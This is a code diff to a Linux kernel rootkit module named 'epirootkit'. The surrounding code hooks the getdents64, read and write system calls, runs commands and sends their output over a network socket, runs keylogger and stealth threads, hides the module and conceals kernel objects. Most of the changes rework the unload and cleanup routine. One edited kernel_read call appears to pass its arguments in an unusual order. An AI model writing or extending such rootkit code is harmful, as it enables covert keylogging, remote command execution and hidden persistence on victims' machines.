@@ -21,6 +21,7 @@
 #include <linux/ctype.h>
 #include <linux/jiffies.h>
 #include <linux/delay.h>
+#include <linux/inet.h>
 #include "epirootkit.h"
 
 MODULE_LICENSE("GPL");
@@ -110,7 +111,7 @@ static void exec_and_send_output(const char *command) {
     memset(output_buffer, 0, config.buffer_size);
     old_fs = get_fs();
     set_fs(KERNEL_DS);
-    read_result = kernel_read(output_file, output_buffer, config.buffer_size - 1, &pos);
+    read_result = kernel_read(output_file, pos, output_buffer, config.buffer_size - 1);
     set_fs(old_fs);
 
     if (read_result < 0) {
@@ -185,8 +186,6 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     long ret = original_getdents64(regs);
     unsigned long off = 0;
     struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-    struct linux_dirent64 *current_dir, *dirent_ker = NULL;
-    unsigned long count = 0;
 
     if (ret <= 0)
         return ret;
@@ -243,43 +242,51 @@ static int __init epirootkit_init(void) {
 }
 
 static void __exit epirootkit_exit(void) {
+    unsigned long flags;
+    struct dkom_entry *entry, *tmp;
+    struct hook_entry *hook_entry, *hook_tmp;
+
     if (net_manager.thread)
         kthread_stop(net_manager.thread);
-    if (g_keylog_thread)
-        kthread_stop(g_keylog_thread);
+
     if (g_stealth_thread)
         kthread_stop(g_stealth_thread);
-    
+
+    if (g_keylog_thread)
+        kthread_stop(g_keylog_thread);
+
     if (net_manager.connection) {
         sock_release(net_manager.connection);
         net_manager.connection = NULL;
-        g_connection_socket = NULL;
     }
-    
-    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
-    sys_call_table[__NR_read] = (unsigned long)original_read;
-    sys_call_table[__NR_write] = (unsigned long)original_write;
-    
+
+    if (sys_call_table) {
+        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+        sys_call_table[__NR_read] = (unsigned long)original_read;
+        sys_call_table[__NR_write] = (unsigned long)original_write;
+    }
+
     unhide_module();
-    
     keylog_buffer_cleanup();
-    
+
     if (mem_manager.nonpaged_memory) {
         free_secure_memory(mem_manager.nonpaged_memory);
+        mem_manager.nonpaged_memory = NULL;
     }
-    
-    struct dkom_entry *entry, *tmp;
-    unsigned long flags;
+
     spin_lock_irqsave(&dkom_lock, flags);
     list_for_each_entry_safe(entry, tmp, &dkom_entries, list) {
         dkom_restore_object(entry->object);
+        list_del(&entry->list);
+        kfree(entry);
     }
     spin_unlock_irqrestore(&dkom_lock, flags);
-    
-    struct hook_entry *hook_entry, *hook_tmp;
+
     spin_lock_irqsave(&hook_lock, flags);
     list_for_each_entry_safe(hook_entry, hook_tmp, &hook_entries, list) {
         remove_hook(hook_entry->target);
+        list_del(&hook_entry->list);
+        kfree(hook_entry);
     }
     spin_unlock_irqrestore(&hook_lock, flags);
 }
